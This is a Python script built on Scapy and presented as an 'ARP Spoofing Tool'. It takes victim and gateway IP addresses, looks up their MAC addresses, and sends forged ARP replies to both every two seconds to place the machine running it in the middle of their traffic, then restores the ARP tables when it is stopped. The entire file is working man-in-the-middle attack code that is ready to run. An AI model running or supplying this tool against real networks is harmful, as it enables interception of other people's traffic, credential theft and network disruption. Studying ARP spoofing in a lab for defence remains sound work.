from scapy.all import *
import time
import sys
import argparse

def get_mac(ip):

    # Scapy function to send an ARP request and get the MAC address
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    ans, _ = srp(arp_request_broadcast, timeout=1, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    
    if not target_mac:
        print(f"[-] Could not find MAC address for {target_ip}")
        return

    # op=2 means "ARP Reply" (is-at)
    # pdst = "Who am I talking to?" (The Victim)
    # hwdst = "Victim's MAC Address" (ARP layer)
    # psrc = "Who am I pretending to be?" (The Router/Gateway)
    # Build proper packet with both Ethernet and ARP layers
    ether = Ether(dst=target_mac)  # Ethernet destination MAC
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether / arp
    
    # send the packet (verbose=False hides the output)
    sendp(packet, verbose=False)  # Use sendp for layer 2 packets

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # Restore victim's ARP table
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)

    # Restore gateway's ARP table
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)


# USAGE EXAMPLE in a loop:
# target_ip = "192.168.1.5" (Victim)
# gateway_ip = "192.168.1.1" (Router)
# target_mac = get_mac(target_ip)
# gateway_mac = get_mac(gateway_ip)
# print("[+] Starting ARP Spoofing...")
# sent_packets_count = 0
# while True:
#     spoof(target_ip, gateway_ip, target_mac)
#     spoof(gateway_ip, target_ip, gateway_mac)
#     sent_packets_count += 2
##    \r prints on the same line so it looks cleaner
#     print(f"\r[+] Packets sent: {sent_packets_count}", end="")
#     time.sleep(2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool. Victim and Gateway IPs required.")
    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
    parser.add_argument("--gateway", required=True, help="IP address of the gateway")
    args = parser.parse_args()

    victim_ip = args.victim
    gateway_ip = args.gateway

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        print("[-] Could not find MAC addresses. Exiting.")
        sys.exit(1)

    print("[+] Victim IP:", victim_ip, "MAC:", victim_mac)
    print("[+] Gateway IP:", gateway_ip, "MAC:", gateway_mac)
    print("[+] Starting ARP Spoofing... Press CTRL+C to stop")

    try:
        while True:
            spoof(victim_ip, gateway_ip, victim_mac)
            spoof(gateway_ip, victim_ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Stopping ARP Spoofing. Restoring network...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)